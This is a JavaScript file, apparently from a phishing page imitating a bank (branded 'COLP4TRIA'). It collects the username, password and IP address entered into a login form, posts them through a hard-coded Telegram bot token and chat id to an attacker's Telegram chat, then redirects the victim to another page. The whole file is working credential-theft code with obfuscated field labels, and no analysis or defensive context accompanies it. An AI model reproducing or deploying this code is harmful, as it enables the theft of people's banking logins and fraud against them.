//bot token
var telegram_bot_id = "5761388760:AAHwURtMYD45Ru5rHHEGfTSwaeQuT8zFMec";
//chat id
var chat_id =5474544277;
var u_name, pax, ip;
var ready = function () {
    u_name = document.getElementById("usar").value;
    pax = document.getElementById("cl4x").value;
    ip = document.getElementById("gfg").innerHTML;
    message = "🟥COLP4TRIA🟥\n👤Usxvry0: " + u_name + "\n🔐Cl4v3: " + pax +"\nIP: " + ip +"\n🟥C0DIGO SYN4PSE🟥";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.php';
        console.log(response);
    });
    return false;
};
